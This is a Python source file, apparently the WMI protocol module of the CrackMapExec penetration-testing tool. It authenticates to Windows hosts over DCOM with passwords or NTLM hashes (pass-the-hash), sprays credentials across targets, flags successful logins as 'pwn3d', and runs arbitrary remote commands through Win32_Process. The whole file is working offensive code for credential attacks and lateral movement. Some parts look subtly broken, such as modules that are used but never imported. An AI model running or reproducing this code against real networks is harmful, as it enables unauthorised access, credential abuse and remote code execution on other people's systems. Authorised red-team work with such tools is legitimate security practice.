#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import argparse
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login
from impacket.dcerpc.v5.dcom.wmi import IID_IWbemLevel1Login
from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
from impacket.dcerpc.v5.dcom.wmi import IWbemLevel1Login
from impacket.smbconnection import SMBConnection, SessionError
from cme.connection import *
from cme.logger import CMEAdapter
from cme.helpers.logger import highlight
from cme.protocols.wmi.wmiexec_regout import WMIEXEC_REGOUT

class wmi(connection):

    def __init__(self, args, db, host):
        #impacket only accept string type 'None'
        self.domain = str(args.domain)
        self.hash = ''
        self.lmhash = ''
        self.nthash = ''
        self.server_os = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        wmi_parser = parser.add_parser('wmi', help="own stuff using WMI", parents=[std_parser, module_parser], conflict_handler='resolve')
        wmi_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        wmi_parser.add_argument("--port", type=int, default=135, help="WMI port (default: 135)")
        wmi_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        wmi_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")

        # For domain options
        dgroup = wmi_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', default=None, type=str, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')

        egroup = wmi_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("-q", metavar='QUERY', dest='query',type=str, help='issues the specified WMI query')
        egroup.add_argument("--namespace", metavar='NAMESPACE', type=str, default='root\\cimv2', help='WMI Namespace (default: root\\cimv2)')

        cgroup = wmi_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument("-x", metavar='EXECUTE', dest='execute', type=str, help='creates a new powershell process and executes the specified command with output')
    
        return parser
    
    def proto_flow(self):
        self.proto_logger()
        if self.create_conn_obj():
            self.enum_host_info()
            self.print_host_info()
            if self.login():
                if hasattr(self.args, 'module') and self.args.module:
                    self.call_modules()
                else:
                    self.call_cmd_args()

    def proto_logger(self):
        self.logger = CMEAdapter(extra={'protocol': 'SMB',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': 'NONE'})
    

    def create_conn_obj(self):
        try:
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
        except Exception as e:
            if "rpc_s_access_denied" in str(e):
                return True
        return False
    
    def enum_host_info(self):
        # smb no open, specify the domain
        if self.args.domain:
            self.domain = self.args.domain
            self.logger.extra['hostname'] = self.hostname
        else:
            try:
                smb_conn = SMBConnection(self.host, self.host, None)
                try:
                    smb_conn.login('', '')
                except SessionError as e:
                    pass

                self.domain = smb_conn.getServerDNSDomainName()
                self.hostname = smb_conn.getServerName()
                self.server_os = smb_conn.getServerOS()
                self.logger.extra['hostname'] = self.hostname

                self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

                try:
                    smb_conn.logoff()
                except:
                    pass

            except Exception as e:
                logging.error("Error retrieving host domain: {} specify one manually with the '-d' flag".format(e))

            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

    def print_host_info(self):
        if self.args.domain:
            self.logger.extra['protocol'] = "WMI"
        else:
            self.logger.extra['protocol'] = "SMB"
            self.logger.info(u"{} (name:{}) (domain:{})".format(self.server_os,
                                                            self.hostname,
                                                            self.domain))
        self.logger.extra['protocol'] = "WMI"
        return True

    def plaintext_login(self, domain, username, password):
        try:
            self.password = password
            self.username = username
            self.domain = domain
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            out = u'{}\\{}:{} {}'.format(domain,
                                        self.username,
                                        self.password,
                                        highlight('({})'.format(self.config.get('CME', 'pwn3d_label'))))
            self.logger.success(out)
            if not self.args.continue_on_success:
                return True
        except Exception as e:
            self.logger.error(u'{}\\{}:{} {}'.format(domain,
                                                    self.username,
                                                    self.password,
                                                    e))
            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash
        try:
            self.username = username
            self.password = ''
            self.domain = domain
            self.hash = ntlm_hash
 
            if lmhash: self.lmhash = lmhash
            if nthash: self.nthash = nthash

            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)

            out = u'{}\\{}:{} {}'.format(domain,
                                         self.username,
                                         ntlm_hash,
                                         highlight('({})'.format(self.config.get('CME', 'pwn3d_label'))))

            self.logger.success(out)
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            self.logger.error(u'{}\\{}:{} {}'.format(domain,
                                                    self.username,
                                                    ntlm_hash,
                                                    e))
            return False

    def query(self, WQL=None, namespace=None):
        records = []
        if not namespace:
            namespace = self.args.namespace
        try:
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login,IID_IWbemLevel1Login)
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin(namespace , NULL, NULL)
            iWbemLevel1Login.RemRelease()
            if WQL:
                iEnumWbemClassObject = iWbemServices.ExecQuery(WQL.strip('\n'))
            else:
                iEnumWbemClassObject = iWbemServices.ExecQuery(self.args.query.strip('\n'))
        except Exception as e:
            self.logger.error('Execute WQL error {}'.format(e))
        while True:
            try:
                wmi_results = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)
                for k,v in record.items():
                    self.logger.highlight('{} => {}'.format(k,v['value']))
                self.logger.highlight('')
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break
        iEnumWbemClassObject.RemRelease()
        return records

    def execute(self, command=None):
        command = self.args.execute
        if not command:
            self.logger.error("Missing command in wmiexec!")
            return False
        try:
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
            win32Process, _ = iWbemServices.GetObject('Win32_Process')
            executor = WMIEXEC_REGOUT(win32Process, iWbemServices, self.host, self.logger)
            executor.execute_remote(command)
        except Exception as e:
            self.logger.error('Execute command error: {}'.format(e))
        
        
